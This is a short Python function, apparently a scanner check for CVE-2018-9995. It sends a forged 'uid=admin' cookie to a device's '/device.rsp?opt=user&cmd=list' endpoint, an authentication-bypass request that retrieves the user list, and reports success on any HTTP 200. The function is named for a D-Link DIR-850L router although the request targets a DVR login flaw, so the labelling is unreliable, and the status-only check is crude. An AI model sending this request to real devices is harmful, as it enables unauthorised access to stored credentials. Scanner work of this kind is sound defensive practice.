import requests
import logging


# CVE-2018-9995 - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9995

def DLink_DIR850L(url: str, verify: bool = True, timeout: int | float = 10) -> bool:

    host = url.split("//")[1].split("/")[0]
    headers = {"Host": host, "User-Agent": "Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "es-AR,en-US;q=0.7,en;q=0.3", "Content-Type": "text/html", "Cookie": "uid=admin"}
    
    try:
        target_url = url + "/device.rsp?opt=user&cmd=list"
        response = requests.get(target_url, headers=headers, verify=verify, timeout=timeout)
    
        if response.status_code == 200:
            return True
    
        else:
            return False
    
    except Exception as e:
        logging.error(e)